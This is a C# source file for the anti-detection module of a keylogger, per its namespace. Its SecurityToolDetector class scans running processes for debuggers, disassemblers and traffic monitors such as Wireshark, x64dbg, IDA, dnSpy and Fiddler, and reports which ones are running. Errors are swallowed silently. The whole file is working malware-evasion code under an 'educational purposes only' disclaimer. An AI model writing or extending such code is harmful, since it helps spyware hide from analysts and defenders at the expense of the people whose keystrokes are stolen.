using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace Keylogger.AntiDetection.ProcessMonitoring
{
    /// <summary>
    /// Detects security analysis tools running on the system
    /// For educational and research purposes only
    /// </summary>
    public class SecurityToolDetector
    {
        private readonly List<string> _securityToolNames;

        public SecurityToolDetector()
        {
            _securityToolNames = new List<string>
            {
                "wireshark",
                "process explorer",
                "process monitor",
                "procmon",
                "procexp",
                "ida",
                "ollydbg", 
                "immunity debugger",
                "x64dbg",
                "windbg",
                "dnspy",
                "dotpeek",
                "fiddler"
            };
        }

        /// <summary>
        /// Initializes the detector with a custom list of security tool names
        /// </summary>
        public SecurityToolDetector(IEnumerable<string> securityToolNames)
        {
            _securityToolNames = new List<string>(securityToolNames);
        }

        /// <summary>
        /// Adds a security tool name to the detection list
        /// </summary>
        public void AddSecurityToolName(string toolName)
        {
            if (!string.IsNullOrWhiteSpace(toolName) && !_securityToolNames.Contains(toolName.ToLower()))
            {
                _securityToolNames.Add(toolName.ToLower());
            }
        }

        /// <summary>
        /// Checks if any known security tools are running on the system
        /// </summary>
        /// <returns>True if a security tool is detected, false otherwise</returns>
        public bool DetectSecurityTools()
        {
            try
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        string processName = process.ProcessName.ToLower();
                        if (_securityToolNames.Any(tool => processName.Contains(tool)))
                        {
                            return true;
                        }
                    }
                    catch (Exception)
                    {
                        // Silently continue if we can't access process info
                        continue;
                    }
                }
                return false;
            }
            catch (Exception)
            {
                // Return false if we encounter any issues accessing process information
                return false;
            }
        }

        /// <summary>
        /// Gets a list of detected security tools currently running
        /// </summary>
        /// <returns>A list of detected security tool process names</returns>
        public List<string> GetDetectedTools()
        {
            List<string> detectedTools = new List<string>();
            
            try
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        string processName = process.ProcessName.ToLower();
                        foreach (string toolName in _securityToolNames)
                        {
                            if (processName.Contains(toolName) && !detectedTools.Contains(processName))
                            {
                                detectedTools.Add(processName);
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Silently continue if we can't access process info
                        continue;
                    }
                }
            }
            catch (Exception)
            {
                // Return empty list if we encounter any issues accessing process information
            }
            
            return detectedTools;
        }
    }
}